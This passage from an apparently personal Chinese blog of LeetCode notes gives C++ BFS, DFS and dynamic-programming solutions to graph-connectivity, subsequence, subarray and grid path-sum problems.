class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">有 n 个城市，其中一些彼此相连，另一些没有相连。如果城市 a 与城市 b 直接相连，且城市 b 与城市 c 直接相连，那么城市 a 与城市 c 间接相连。</span><br><span class="line"></span><br><span class="line">省份 是一组直接或间接相连的城市，组内不含其他没有相连的城市。</span><br><span class="line"></span><br><span class="line">给你一个 n x n 的矩阵 isConnected ，其中 isConnected[i][j] = 1 表示第 i 个城市和第 j 个城市直接相连，而 isConnected[i][j] = 0 表示二者不直接相连。</span><br><span class="line"></span><br><span class="line">返回矩阵中 省份 的数量。</span><br></pre></td></tr></table></figure><p>示例 1：</p><p>输入：isConnected = [[1,1,0],[1,1,0],[0,0,1]]<br>输出：2</p><p><img src="https://assets.leetcode.com/uploads/2020/12/24/graph1.jpg" alt="img"></p><p>示例 2：</p><p>输入：isConnected = [[1,0,0],[0,1,0],[0,0,1]]<br>输出：3</p><p><img src="https://assets.leetcode.com/uploads/2020/12/24/graph2.jpg" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以采用bfs、dfs、并查集的方式</span><br></pre></td></tr></table></figure><p>bfs</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;bool&gt; isvisit;</span><br><span class="line">void bfs(vector&lt;vector&lt;int&gt;&gt;&amp; isConnected,int i)</span><br><span class="line">&#123;</span><br><span class="line">    isvisit[i]=true;</span><br><span class="line">    int node=i;</span><br><span class="line">    queue&lt;int&gt; que;</span><br><span class="line">    que.push(node);</span><br><span class="line">    while(!que.empty())</span><br><span class="line">    &#123;</span><br><span class="line">        int size=que.size();</span><br><span class="line">        int tmp=que.front();</span><br><span class="line">        que.pop();</span><br><span class="line">        for(int j=0;j&lt;isConnected.size();j++)</span><br><span class="line">        &#123;</span><br><span class="line">            if(tmp==j)</span><br><span class="line">            &#123;</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line">            if(!isvisit[j]&amp;&amp;isConnected[tmp][j]==1)</span><br><span class="line">            &#123;</span><br><span class="line">                que.push(j);</span><br><span class="line">                isvisit[j]=true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">int findCircleNum(vector&lt;vector&lt;int&gt;&gt;&amp; isConnected) &#123;</span><br><span class="line">    isvisit=vector&lt;bool&gt;(isConnected.size(),false);</span><br><span class="line">    int count=0;</span><br><span class="line">    for(int i=0;i&lt;isConnected.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(!isvisit[i])</span><br><span class="line">        &#123;</span><br><span class="line">            bfs(isConnected,i);</span><br><span class="line">            count++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>dfs</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;bool&gt; isvisit;</span><br><span class="line">void dfs(vector&lt;vector&lt;int&gt;&gt;&amp; isConnected,int i)</span><br><span class="line">&#123;</span><br><span class="line">    isvisit[i]=true;</span><br><span class="line">    for(int j=0;j&lt;isConnected.size();j++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(i==j)</span><br><span class="line">        &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">        if(!isvisit[j]&amp;&amp;isConnected[i][j]==1)</span><br><span class="line">        &#123;</span><br><span class="line">            dfs(isConnected,j);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">int findCircleNum(vector&lt;vector&lt;int&gt;&gt;&amp; isConnected) &#123;</span><br><span class="line">    isvisit=vector&lt;bool&gt;(isConnected.size(),false);</span><br><span class="line">    int count=0;</span><br><span class="line">    for(int i=0;i&lt;isConnected.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(!isvisit[i])</span><br><span class="line">        &#123;</span><br><span class="line">            dfs(isConnected,i);</span><br><span class="line">            count++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="5-动态规划"><a href="#5-动态规划" class="headerlink" title="5.动态规划"></a>5.动态规划</h1><h2 id="子序列问题"><a href="#子序列问题" class="headerlink" title="子序列问题"></a>子序列问题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">一般dp[i]或者dp[i][j]定义均是以i或者j结尾的nums满足的最大。。。，然后有一个全局变量记录所有的最大值</span><br><span class="line"></span><br><span class="line">如果不行再将dp[i]定义为非结尾数字的满足题意的最大值</span><br></pre></td></tr></table></figure><p><img src="https://pic.leetcode-cn.com/1625312260-JHtQFs-image.png" alt="image.png"></p><h2 id="最长公共子序列（LCS-最多的不相交的线"><a href="#最长公共子序列（LCS-最多的不相交的线" class="headerlink" title="最长公共子序列（LCS)+最多的不相交的线"></a>最长公共子序列（LCS)+最多的不相交的线</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这个定义就不是以i结尾</span><br><span class="line">输入：text1 = &quot;abcde&quot;, text2 = &quot;ace&quot; </span><br><span class="line">输出：3  </span><br><span class="line">解释：最长公共子序列是 &quot;ace&quot; ，它的长度为 3 。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    int longestCommonSubsequence(string text1, string text2) &#123;</span><br><span class="line">        int max=INT_MIN;</span><br><span class="line">        int m=text1.size();</span><br><span class="line">        int n=text2.size();</span><br><span class="line">        //dp[i+1][j+1]定义为t1[0：i]与t2[0：j]的最大公共子序列为结尾</span><br><span class="line">        vector&lt;vector&lt;int&gt;&gt; dp(m+1,vector&lt;int&gt;(n+1,0));</span><br><span class="line">        for(int i=0;i&lt;m;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            for(int j=0;j&lt;n;j++)</span><br><span class="line">            &#123;</span><br><span class="line">                if(text1[i]==text2[j])</span><br><span class="line">                &#123;</span><br><span class="line">                    dp[i+1][j+1]=dp[i][j]+1;</span><br><span class="line">                &#125;</span><br><span class="line">                else</span><br><span class="line">                &#123;</span><br><span class="line">                    dp[i+1][j+1]=std::max(dp[i+1][j],dp[i][j+1]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return dp[m][n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="最大子序列和"><a href="#最大子序列和" class="headerlink" title="最大子序列和"></a>最大子序列和</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [-2,1,-3,4,-1,2,1,-5,4]</span><br><span class="line">输出：6</span><br><span class="line">解释：连续子数组 [4,-1,2,1] 的和最大，为 6 </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">//动态规划</span><br><span class="line">1.dp数组定义</span><br><span class="line">dp[i]表示以nums[i]结尾的子序列最大值   i:0~n-1</span><br><span class="line">2.状态转移方程</span><br><span class="line">dp[i]=max(dp[i-1],dp[i-1]+nums[i])</span><br><span class="line"></span><br><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    //动态规划</span><br><span class="line">    //1.dp[i]表示以nums[i]结尾的最大子序列和</span><br><span class="line">    int maxSubArray(vector&lt;int&gt;&amp; nums) &#123;</span><br><span class="line">        vector&lt;int&gt; dp(nums.size(),0);</span><br><span class="line">        dp[0]=nums[0];</span><br><span class="line">        int ans=dp[0];</span><br><span class="line">        for(int i=1;i&lt;nums.size();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            dp[i]=max(nums[i],dp[i-1]+nums[i]);</span><br><span class="line">            ans=max(ans,dp[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        return ans;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="输出最大子数组和的每个元素"><a href="#输出最大子数组和的每个元素" class="headerlink" title="输出最大子数组和的每个元素"></a>输出最大子数组和的每个元素</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用两个hashtable存区间开始值和结束值</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;bits/stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">vector&lt;int&gt; maxSubArray(vector&lt;int&gt; input)</span><br><span class="line">&#123;</span><br><span class="line">    int n=input.size();</span><br><span class="line">    //key是最大值,value为起始位置</span><br><span class="line">    unordered_map&lt;int,int&gt; hash;</span><br><span class="line">    unordered_map&lt;int,int&gt; hashe;</span><br><span class="line">    vector&lt;int&gt; dp(n,0);</span><br><span class="line">    //dp[i]表示以input[i]结尾最大子序列和</span><br><span class="line">    dp[0]=input[0];</span><br><span class="line">    for(int i=1;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(dp[i-1]&lt;0)</span><br><span class="line">        &#123;</span><br><span class="line">            dp[i]=input[i];</span><br><span class="line">            hash[dp[i]]=i;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            dp[i]=input[i]+dp[i-1];</span><br><span class="line">            hash[dp[i]]=hash[dp[i-1]];</span><br><span class="line">        &#125;</span><br><span class="line">        hashe[dp[i]]=i;</span><br><span class="line">    &#125;</span><br><span class="line">    int mini=dp[0];</span><br><span class="line">    for(int i=1;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        mini=max(dp[i],mini);</span><br><span class="line">    &#125;</span><br><span class="line">    int start=hash[mini];</span><br><span class="line">    int end=hashe[mini];</span><br><span class="line">    vector&lt;int&gt; ans;</span><br><span class="line">    for(int i=start;i&lt;=end;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ans.push_back(input[i]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    return ans;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int n;</span><br><span class="line">    vector&lt;int&gt; input;</span><br><span class="line">    while(cin&gt;&gt;n)</span><br><span class="line">    &#123;</span><br><span class="line">        if(getchar()==&#x27;\n&#x27;)</span><br><span class="line">            break;</span><br><span class="line">        input.push_back(n);</span><br><span class="line">    &#125;</span><br><span class="line">    vector&lt;int&gt; ans=maxSubArray(input);</span><br><span class="line">    for(auto num:ans)</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;num&lt;&lt;&quot; &quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="字符串最长公共子数组并输出"><a href="#字符串最长公共子数组并输出" class="headerlink" title="字符串最长公共子数组并输出"></a>字符串最长公共子数组并输出</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a:&quot;abcde&quot;    b:&quot;cd&quot;</span><br><span class="line">输出：&quot;cd&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;bits/stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int maxlen=INT_MIN;</span><br><span class="line">int start=0;</span><br><span class="line">pair&lt;int,int&gt; getstr(string a,string b)</span><br><span class="line">&#123;</span><br><span class="line">    if(a.size()&lt;b.size())</span><br><span class="line">    &#123;</span><br><span class="line">        swap(a,b);</span><br><span class="line">    &#125;</span><br><span class="line">    vector&lt;vector&lt;int&gt;&gt; dp(a.size()+1,vector&lt;int&gt;(b.size()+1,0));</span><br><span class="line">    for(int i=0;i&lt;a.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">        for(int j=0;j&lt;b.size();j++)</span><br><span class="line">        &#123;</span><br><span class="line">            if(a[i]==b[j])</span><br><span class="line">            &#123;</span><br><span class="line">                dp[i+1][j+1]=dp[i][j]+1;</span><br><span class="line">            &#125;</span><br><span class="line">            if(dp[i+1][j+1]&gt;maxlen)</span><br><span class="line">            &#123;</span><br><span class="line">                maxlen=dp[i+1][j+1];</span><br><span class="line">                start=i-maxlen+1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return &#123;start,maxlen&#125;;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    string a=&quot;abcde&quot;;</span><br><span class="line">    string b=&quot;cd&quot;;</span><br><span class="line">    int s;</span><br><span class="line">    int len;</span><br><span class="line">    tie(s,len)=getstr(a,b);</span><br><span class="line">    cout&lt;&lt;a.substr(s,len)&lt;&lt;endl;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="回文串数量"><a href="#回文串数量" class="headerlink" title="回文串数量"></a>回文串数量</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dp[i][j]定义为s[i,j]之间是否为回文串</span><br><span class="line">i&lt;=j，则只填充右上角，dp[i][j]=true if s[i]==s[j]&amp;&amp;(j-i)&lt;2||dp[i+1][j-1]</span><br></pre></td></tr></table></figure><h2 id="最大正方形"><a href="#最大正方形" class="headerlink" title="最大正方形"></a>最大正方形</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">递推公式</span><br><span class="line">dp(i,j)=min(dp(i-1,j-1),dp(i-1,j),dp(i,j-1))</span><br></pre></td></tr></table></figure><p><img src="https://assets.leetcode.com/uploads/2020/11/26/max1grid.jpg" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    int maximalSquare(vector&lt;vector&lt;char&gt;&gt;&amp; matrix) &#123;</span><br><span class="line">        //dp[i][j]表示以matrix[i-1][j-1]为右下角正方向最大值</span><br><span class="line">        int m=matrix.size();</span><br><span class="line">        int n=matrix[0].size();</span><br><span class="line">        int ans=0;</span><br><span class="line">        vector&lt;vector&lt;int&gt;&gt; dp(m+1,vector&lt;int&gt;(n+1,0));</span><br><span class="line">        //dp[i][j]初始化为0，表示初始为0</span><br><span class="line">        //递推公式</span><br><span class="line">        //matrix[i][j]==1时</span><br><span class="line">        //dp[i][j]=min(dp[i-1][j-1],dp[i-1][j],dp[i][j-1])+1;</span><br><span class="line">        for(int i=0;i&lt;m;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            for(int j=0;j&lt;n;j++)</span><br><span class="line">            &#123;</span><br><span class="line">                if(matrix[i][j]==&#x27;1&#x27;)</span><br><span class="line">                &#123;</span><br><span class="line">                    dp[i+1][j+1]=min(min(dp[i][j],dp[i][j+1]),dp[i+1][j])+1;</span><br><span class="line">                    ans=max(ans,dp[i+1][j+1]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return ans*ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">//正方形子矩阵个数=所有dp[i][j]之和</span><br></pre></td></tr></table></figure><h2 id="最小路径和并输出最小路径"><a href="#最小路径和并输出最小路径" class="headerlink" title="最小路径和并输出最小路径"></a>最小路径和并输出最小路径</h2><p><img src="https://assets.leetcode.com/uploads/2020/11/05/minpath.jpg" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：grid = [[1,3,1],[1,5,1],[4,2,1]]</span><br><span class="line">输出：7</span><br><span class="line">解释：因为路径 1→3→1→1→1 的总和最小。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;bits/stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">pair&lt;vector&lt;vector&lt;pair&lt;int,int&gt;&gt;&gt;,int&gt; getminpath(vector&lt;vector&lt;int&gt;&gt;&amp; matrix)</span><br><span class="line">&#123;</span><br><span class="line">    int n=matrix.size();</span><br><span class="line">    int m=matrix[0].size();</span><br><span class="line">    vector&lt;vector&lt;int&gt;&gt; dp(n,vector&lt;int&gt;(m,INT_MAX));</span><br><span class="line">    //coorinate存当前[i,j]节点上一个最优点</span><br><span class="line">    vector&lt;vector&lt;pair&lt;int,int&gt;&gt;&gt; coordinate(n,vector&lt;pair&lt;int,int&gt;&gt;(m,&#123;0,0&#125;));</span><br><span class="line">    for(int i=0;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        for(int j=0;j&lt;m;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            if(i==0&amp;&amp;j==0)</span><br><span class="line">            &#123;</span><br><span class="line">                dp[i][j]=matrix[i][j];</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line">            else if(i==0)</span><br><span class="line">            &#123;</span><br><span class="line">                dp[i][j]=dp[i][j-1]+matrix[i][j];</span><br><span class="line">                coordinate[i][j]=pair&lt;int,int&gt;(i,j-1);</span><br><span class="line">            &#125;</span><br><span class="line">            else if(j==0)</span><br><span class="line">            &#123;</span><br><span class="line">                dp[i][j]=dp[i-1][j]+matrix[i][j];</span><br><span class="line">                coordinate[i][j]=pair&lt;int,int&gt;(i-1,j);                </span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                int left=dp[i][j-1]+matrix[i][j];</span><br><span class="line">                int up=dp[i-1][j]+matrix[i][j];</span><br><span class="line">                dp[i][j]=min(left,up);</span><br><span class="line">                coordinate[i][j]=left&lt;up?pair&lt;int,int&gt;(i,j-1):pair&lt;int,int&gt;(i-1,j);                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return &#123;coordinate,dp[n-1][m-1]&#125;;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    vector&lt;vector&lt;int&gt;&gt; matrix&#123;&#123;1,3,1&#125;,&#123;1,5,1&#125;,&#123;4,2,1&#125;&#125;;</span><br><span class="line">    vector&lt;vector&lt;pair&lt;int,int&gt;&gt;&gt; cor;</span><br><span class="line">    int min_sum;</span><br><span class="line">    int n=matrix.size();</span><br><span class="line">    int m=matrix[0].size();</span><br><span class="line">    tie(cor,min_sum)=getminpath(matrix);</span><br><span class="line">    vector&lt;pair&lt;int,int&gt;&gt; ans;</span><br><span class="line">    pair&lt;int,int&gt; tmp=cor[n-1][m-1];</span><br><span class="line">    ans.push_back(&#123;n-1,m-1&#125;);</span><br><span class="line">    while(tmp.first!=0||tmp.second!=0)</span><br><span class="line">    &#123;</span><br><span class="line">        ans.push_back(tmp);</span><br><span class="line">        tmp=cor[tmp.first][tmp.second];</span><br><span class="line">    &#125;</span><br><span class="line">    ans.push_back(&#123;0,0&#125;);</span><br><span class="line">    reverse(ans.begin(),ans.end());</span><br><span class="line">    cout&lt;&lt;min_sum&lt;&lt;endl;</span><br><span class="line">    for(auto cor:ans)</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;&quot;(&quot;&lt;&lt;cor.first&lt;&lt;&quot;,&quot;&lt;&lt;cor.second&lt;&lt;&quot;)&quot;&lt;&lt;&quot;-&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="三角形最小路径和"><a href="#三角形最小路径和" class="headerlink" title="三角形最小路径和"></a>三角形最小路径和</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">分别处理第一列和对角线上的元素</span><br><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    //dp[i-1][j-1]表示以tri[i-1][j-1]为结尾的最小路径和</span><br><span class="line">    int minimumTotal(vector&lt;vector&lt;int&gt;&gt;&amp; triangle) &#123;</span><br><span class="line">        int m=triangle.size();</span><br><span class="line">        vector&lt;vector&lt;int&gt;&gt; dp(m,vector&lt;int&gt;(m,0));</span><br><span class="line">        dp[0][0]=triangle[0][0];</span><br><span class="line">        for(int i=1;i&lt;m;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            dp[i][0]=dp[i-1][0]+triangle[i][0];</span><br><span class="line">        &#125;</span><br><span class="line">        for(int i=1;i&lt;m;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            for(int j=1;j&lt;i;j++)</span><br><span class="line">            &#123;</span><br><span class="line">                dp[i][j]=min(dp[i-1][j-1],dp[i-1][j])+triangle[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">            dp[i][i]=dp[i-1][i-1]+triangle[i][i];</span><br><span class="line">        &#125;</span><br><span class="line">        return *min_element(dp[m-1].begin(),dp[m-1].end());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="解码方法"><a href="#解码方法" class="headerlink" title="解码方法"></a>解码方法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;226&quot;</span><br><span class="line">输出：3</span><br><span class="line">解释：它可以解码为 &quot;BZ&quot; (2 26), &quot;VF&quot; (22 6), 或者 &quot;BBF&quot; (2 2 6) </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td 